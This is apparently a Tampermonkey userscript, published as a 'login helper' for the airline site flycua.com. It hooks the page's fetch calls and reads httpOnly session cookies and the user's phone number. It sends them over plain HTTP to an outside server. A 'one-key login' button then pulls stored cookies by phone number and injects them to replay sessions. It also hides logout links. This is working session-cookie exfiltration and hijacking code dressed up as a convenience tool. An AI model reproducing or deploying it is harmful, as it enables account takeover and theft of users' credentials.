// ==UserScript==
// @name         Kn辅助登录
// @namespace    https://bbs.tampermonkey.net.cn/
// @version      0.7.0
// @description  try to take over the world!
// @grant        GM_xmlhttpRequest
// @grant        GM_cookie
// @author       You
// @match        https://*.flycua.com/*
// @connect      conversationserver.spider.htairline.com
// @connect      .flycua.com
// @grant        unsafeWindow
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/527295/Kn%E8%BE%85%E5%8A%A9%E7%99%BB%E5%BD%95.user.js
// @updateURL https://update.greasyfork.org/scripts/527295/Kn%E8%BE%85%E5%8A%A9%E7%99%BB%E5%BD%95.meta.js
// ==/UserScript==

(async function () {
    'use strict';

    var domain = 'http://conversationserver.spider.htairline.com/jing_dong/'
    let originFetch = window.fetch
    unsafeWindow.fetch = async(...arg) => {
        if (arg[0].indexOf('/api/user/web/current-user') > -1) {
            let respone = await originFetch(...arg)
            const responseClone = respone.clone();
            let res = await responseClone.json();
            let phone = res.result.mobile
            GM_cookie.list({
                domain: '.flycua.com',
                httpOnly: true
            }, (item) => {
                const data = {}
                item.forEach(c => {
                    if (['tokenId', 'tokenUUID', 'aili_token', 'flycua_identify_default'].includes(c.name)) {
                        data[c.name] = c.value
                    }
                })
                GM_xmlhttpRequest({
                    url: domain+"set_kn_cookie",
                    method:"post",
                    data:JSON.stringify({
                        "cookie_info": JSON.stringify(data),
                        "phone": phone
                    }),
                    onload: function (xhr) {
                        console.log(xhr.responseText)
                    },
                    onerror: function (xhr) {
                        console.log(xhr.responseText)
                    }
                })
            })
            return respone
        } else if (arg[0].indexOf('/api/user/web/login/logout') > -1){
            GM_cookie.list({
                domain: '.flycua.com',
                httpOnly: true
            }, (item) => {
                item.forEach(c => {
                    GM_cookie("delete", {
                        "name": c.name,
                        "domain": ".flycua.com"
                    });
                })
            })
            window.location = "https://m.flycua.com/"
            return new Promise((resolve, reject) => {
                resolve()
            })
        }else {
            return originFetch(...arg);
        }
    }

    function checkPath() {
        setTimeout(() => {
            if (location.pathname === '/login') {
                const tip = document.createElement("div")
                tip.style.position = 'fixed'
                tip.style.left = '0'
                tip.style.right = '0'
                tip.style.textAlign = 'center'
                tip.style.bottom = '200px'
                tip.style.fontSize = '16px'
                tip.style.color = 'red'
                tip.style.fontWeight = 'bold'
                document.body.appendChild(tip)
                const div = document.createElement("div")
                div.textContent = "一键登录"
                div.style.position = 'fixed'
                div.style.left = 'calc(50% - 70px)'
                div.style.right = '0'
                div.style.width = '120px'
                div.style.textAlign = 'center'
                div.style.borderRadius = '16px'
                div.style.bottom = '100px'
                div.style.background = 'rgba(84, 145, 89)'
                div.style.color = "white"
                div.style.padding = '10px'
                div.style.fontSize = '30px'
                div.style.fontWeight = 'bold'
                document.body.appendChild(div)
                div.addEventListener("click", () => {
                    const phone = document.querySelector("input[placeholder='手机号']").value
                    if (!phone) {
                        tip.textContent = '手机号不能为空'
                        return
                    }
                    setCookie(phone)
                })
            }else if (location.pathname === '/account/setting'){
                const btn = document.querySelector("div[data-testid='button-text']")
                if (btn){
                    btn.style.color = "white"
                    btn.parentNode.parentNode.style.background = "rgba(95, 173, 101)"
                }
            }
            checkPath()
        },500)
    }

    function checkWWWPage() {
        setTimeout(() => {
            const logout = document.querySelector("a[href='/app/member/logout']")
            if(logout){
                logout.href = "https://m.flycua.com/account/setting"
            }
            const btns = document.getElementsByClassName("offcial-home")
            for (let i = 0; i < btns.length; i++) {
                if (btns[i].textContent === '[退出]'){
                    btns[i].remove()
                }
            }
            checkWWWPage()
        },500)
    }

    checkWWWPage()


    let old = history.pushState
    unsafeWindow.history.pushState = function (...arg) {
        checkPath()
        return old.call(this, ...arg)
    }

    checkPath()
    function setCookie(phone) {
        GM_xmlhttpRequest({
            url: domain+"get_kn_cookie?phone=" + phone,
            onload: function (xhr) {
                const data = JSON.parse(xhr.responseText)
                if (data.code != 0) {
                    tip.textContent = data.data
                    return
                }
                const cookies = JSON.parse(data.data)
                for (const key in cookies) {
                    GM_cookie("set", {
                        "name": key,
                        "value": cookies[key],
                        "httpOnly": true,
                        "domain": ".flycua.com"
                    });
                }
                window.location.href = "https://m.flycua.com/buyer/index"
            },
        })
    }
})();